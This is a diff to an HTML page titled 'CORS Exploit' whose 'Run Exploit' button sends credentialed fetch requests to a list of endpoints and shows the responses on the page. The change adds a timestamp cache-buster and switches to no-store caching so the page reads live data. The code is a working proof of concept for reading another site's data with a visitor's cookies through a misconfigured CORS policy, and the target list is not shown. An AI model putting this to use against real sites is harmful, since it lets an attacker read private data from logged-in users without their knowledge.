@@ -44,7 +44,7 @@ pre {
 </head>
 <body>
 
-<h2>CORS Exploit</h2>
+<h2>CORS Exploit (Live Requests Only)</h2>
 <button onclick="runExploit()">Run Exploit</button>
 
 <div class="container" id="results"></div>
@@ -78,10 +78,13 @@ async function fetchData(url) {
     const pre = card.querySelector("pre");
 
     try {
-        const res = await fetch(url, {
+        // 🔥 cache bypass
+        const uniqueUrl = url + (url.includes("?") ? "&" : "?") + "t=" + Date.now();
+
+        const res = await fetch(uniqueUrl, {
             method: "GET",
             credentials: "include",
-            cache: "force-cache" // 🔥 إجبار استخدام الكاش
+            cache: "no-store" // ضمان عدم استخدام cache
         });
 
         const text = await res.text();
@@ -103,9 +106,7 @@ async function fetchData(url) {
 
 function runExploit() {
     document.getElementById("results").innerHTML = "";
-    endpoints.forEach(url => {
-        fetchData(url);
-    });
+    endpoints.forEach(fetchData);
 }
 </script>
 
